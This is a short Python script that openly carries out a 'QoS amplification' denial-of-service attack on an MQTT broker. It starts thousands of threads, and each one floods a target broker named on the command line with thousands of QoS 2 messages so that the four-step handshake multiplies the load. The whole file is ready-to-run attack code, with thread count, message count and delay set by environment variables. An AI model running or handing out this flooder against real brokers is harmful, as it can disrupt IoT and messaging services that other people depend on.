#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import os
import sys
import threading
import time

def qos_amplification_attack(broker, port, client_id, count, delay_ms):
    client = mqtt.Client(client_id=f"amplifier_{client_id}")
    client.connect(broker, port, 60)
    
    # QoS 2 garante entrega exatamente uma vez - 4 handshakes!
    # PUBLISH -> PUBREC -> PUBREL -> PUBCOMP
    for i in range(count):
        client.publish("amp/target", f"QoS2_Amplified_{client_id}_{i}", qos=2)
        if delay_ms > 0:
            time.sleep(delay_ms / 1000)
    
    client.disconnect()
    print(f"Client {client_id} completed QoS amplification")

if __name__ == "__main__":
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    threads_count = int(os.getenv("THREADS", "2000"))
    count = int(os.getenv("COUNT", "2000"))
    delay_ms = int(os.getenv("DELAY_MS", "0"))

    threads = []
    for i in range(threads_count):  # clients x QoS 2 messages
        t = threading.Thread(target=qos_amplification_attack, args=(broker, port, i, count, delay_ms))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("QoS Amplification attack completed")
